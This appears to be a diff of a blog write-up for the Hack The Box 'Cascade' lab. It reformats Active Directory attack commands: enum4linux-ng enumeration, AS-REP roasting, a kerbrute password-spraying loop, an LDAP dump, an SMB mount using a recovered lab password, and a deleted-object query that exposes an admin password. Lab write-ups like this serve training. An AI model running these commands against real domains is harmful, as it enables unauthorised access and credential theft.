@@ -134,25 +134,27 @@ Host script results:
 
 <p>we run it using the <code class="language-plaintext highlighter-rouge">-A</code> switch as well as <code class="language-plaintext highlighter-rouge">-oY</code> to output into <strong>YAML format</strong>.</p>
 
-<p>Command: <code class="language-plaintext highlighter-rouge">enum4linux-ng -A 10.10.10.182 -oY e4lng-output</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux-ng <span class="nt">-A</span> 10.10.10.182 <span class="nt">-oY</span> e4lng-output
+</code></pre></div></div>
 
 <p>we get a bunch of cool stuff:</p>
 
-<ol>
-  <li>usernames</li>
-</ol>
+<ul>
+  <li><strong>Usernames</strong></li>
+</ul>
 
 <p><img src="/assets/Cascade/e4lng-output-users.jpg" alt="e4lng-output-users" /></p>
 
-<ol>
-  <li>groups</li>
-</ol>
+<ul>
+  <li><strong>Groups</strong></li>
+</ul>
 
 <p><img src="/assets/Cascade/e4lng-output-groups.jpg" alt="e4lng-output-groups" /></p>
 
-<ol>
-  <li>password policy</li>
-</ol>
+<ul>
+  <li><strong>Password Policy</strong></li>
+</ul>
 
 <p><img src="/assets/Cascade/e4lng-output-pass-pol.jpg" alt="e4lng-output-pass-pol" /></p>
 
@@ -161,7 +163,9 @@ Host script results:
 <h3 id="time-saving-1-asreproasting">Time Saving #1: ASREPRoasting</h3>
 <p><em>To save time,</em> we’re going to do the <strong>ASREPRoast</strong> first because it’s a quick check and has a high chance of giving us creds (<em>if we crack the hash</em>).</p>
 
-<p>Command: <code class="language-plaintext highlighter-rouge">GetNPUsers.py -dc-ip 10.10.10.182 -request -debug -usersfile users.txt cascade.local/</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetNPUsers.py <span class="nt">-dc-ip</span> 10.10.10.182 <span class="nt">-request</span> <span class="nt">-debug</span> <span class="nt">-usersfile</span> users.txt cascade.local/
+</code></pre></div></div>
 
 <p><strong>Note:</strong> <em>I generally prefer to use the</em> <code class="language-plaintext highlighter-rouge">-debug</code> <em>flag with everything. It can save me a lot of time in troubleshooting.</em></p>
 
@@ -174,7 +178,9 @@ Host script results:
 <h3 id="time-saving-2-password-spraying-in-the-background">Time Saving #2: Password Spraying in the background</h3>
 <p><em>Since the password policy contained no user lockout,</em> we’re good to go spraying :D</p>
 
-<p>Command: <code class="language-plaintext highlighter-rouge">for i in $(cat /opt/Seclists/Passwords/Common-Credentials/500-worst-passwords.txt); do kerbrute passwordspray --dc 10.10.10.182 -d cascade.local users.txt $i | grep -oP '\[\+\].*'; done</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> /opt/Seclists/Passwords/Common-Credentials/500-worst-passwords.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>kerbrute passwordspray <span class="nt">--dc</span> 10.10.10.182 <span class="nt">-d</span> cascade.local users.txt <span class="nv">$i</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\+\].*'</span><span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
 
 <p>what this does:</p>
 
@@ -204,7 +210,9 @@ Host script results:
 <h3 id="ldap">LDAP</h3>
 <p>We’re going to enumerate <strong>LDAP</strong> and see if we can find something there.</p>
 
-<p>Command: <code class="language-plaintext highlighter-rouge">ldapsearch -x -H ldap://10.10.10.182 -b 'dc=cascade,dc=local'</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s1">'dc=cascade,dc=local'</span>
+</code></pre></div></div>
 
 <p>The output was huge (6k+ lines). So we saved it to <code class="language-plaintext highlighter-rouge">ldap-output</code></p>
 
@@ -303,9 +311,13 @@ Host script results:
 
 <p><img src="/assets/Cascade/steve-smb-access.jpg" alt="steve-smb-access" /></p>
 
-<p>we mount the share with: <code class="language-plaintext highlighter-rouge">mount -t cifs -o 'username=s.smith,password=sT333ve2' //10.10.10.182/Audit$ /mnt</code></p>
+<p>we mount the share with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="s1">'username=s.smith,password=sT333ve2'</span> //10.10.10.182/Audit<span class="nv">$ </span>/mnt
+</code></pre></div></div>
 
-<p>and list the files with: <code class="language-plaintext highlighter-rouge">find /mnt -type f 2&gt;/dev/null</code></p>
+<p>and list the files with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /mnt <span class="nt">-type</span> f 2&gt;/dev/null
+</code></pre></div></div>
 
 <p><img src="/assets/Cascade/mount-and-find.jpg" alt="mount-and-find" /></p>
 
@@ -368,7 +380,7 @@ Host script results:
 
 <p><img src="/assets/Cascade/dnspy-casc-exe.jpg" alt="dnspy-casc-exe" /></p>
 
-<p>it’s <code class="language-plaintext highlighter-rouge">c4scadek3y654321</code></p>
+<p>it’s <strong>“c4scadek3y654321”</strong></p>
 
 <p><em>Looking at the code,</em> it seems that the <code class="language-plaintext highlighter-rouge">.exe</code> reads the encrypted password from the database and decrypts it using the <code class="language-plaintext highlighter-rouge">DecryptString</code> function before moving on to carry out its tasks.</p>
 
@@ -413,7 +425,9 @@ Host script results:
 
 <p>Just in case his password was in one of them. Just like the <code class="language-plaintext highlighter-rouge">r.thompson</code> user or something.</p>
 
-<p>Command: <code class="language-plaintext highlighter-rouge">Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects -Properties * | Select -Last 1</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-ldapFilter</span><span class="p">:</span><span class="s2">"(msDS-LastKnownRDN=*)"</span><span class="w"> </span><span class="nt">-IncludeDeletedObjects</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Last</span><span class="w"> </span><span class="nx">1</span><span class="w">
+</span></code></pre></div></div>
 
 <p><img src="/assets/Cascade/temp-admin-password.jpg" alt="temp-admin-password" /></p>
 
